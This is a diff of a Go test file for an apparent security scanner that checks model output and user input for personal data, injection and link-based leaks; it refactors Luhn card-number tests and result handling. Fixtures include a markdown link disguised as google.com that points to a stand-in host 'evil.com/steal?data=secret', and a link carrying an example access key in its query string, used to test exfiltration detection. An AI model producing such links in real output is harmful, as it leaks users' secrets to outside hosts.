@@ -143,10 +143,18 @@ func TestPIIClusterDetection(t *testing.T) {
 func TestCreditCardLuhn(t *testing.T) {
 	valid := "4532015112830366"   // passes Luhn
 	invalid := "4532015112830367" // fails Luhn
-	if !luhnCheck(valid) {
+	vd := make([]int, len(valid))
+	for i, c := range valid {
+		vd[i] = int(c - '0')
+	}
+	id := make([]int, len(invalid))
+	for i, c := range invalid {
+		id[i] = int(c - '0')
+	}
+	if !luhnCheck(vd) {
 		t.Error("valid card failed Luhn")
 	}
-	if luhnCheck(invalid) {
+	if luhnCheck(id) {
 		t.Error("invalid card passed Luhn")
 	}
 }
@@ -228,9 +236,9 @@ func TestBenignSafeGuard(t *testing.T) {
 
 func TestMarkdownDisguisedLink(t *testing.T) {
 	input := "[google.com](https://evil.com/steal?data=secret)"
-	res := ScanMarkdown(input, SourceModelOutput)
+	findings := ScanMarkdown(input, SourceModelOutput)
 	found := false
-	for _, f := range res.Findings {
+	for _, f := range findings {
 		if f.Label == "disguised_link" {
 			found = true
 		}
@@ -242,9 +250,9 @@ func TestMarkdownDisguisedLink(t *testing.T) {
 
 func TestMarkdownQueryPayload(t *testing.T) {
 	input := "[link](https://example.com/?k=AKIAIOSFODNN7EXAMPLE)"
-	res := ScanMarkdown(input, SourceModelOutput)
+	findings := ScanMarkdown(input, SourceModelOutput)
 	found := false
-	for _, f := range res.Findings {
+	for _, f := range findings {
 		if f.Label == "query_exfiltration_payload" {
 			found = true
 		}
@@ -268,25 +276,4 @@ func BenchmarkScanInjectionLong(b *testing.B) {
 	for i := 0; i < b.N; i++ {
 		Scan(text, ScanConfig{Direction: DirectionInbound, Source: SourceUser})
 	}
-}
-
-// luhnCheck validates a numeric string with the Luhn algorithm.
-func luhnCheck(s string) bool {
-	sum := 0
-	alternate := false
-	for i := len(s) - 1; i >= 0; i-- {
-		n := int(s[i] - '0')
-		if n < 0 || n > 9 {
-			return false
-		}
-		if alternate {
-			n *= 2
-			if n > 9 {
-				n -= 9
-			}
-		}
-		sum += n
-		alternate = !alternate
-	}
-	return sum%10 == 0
 }
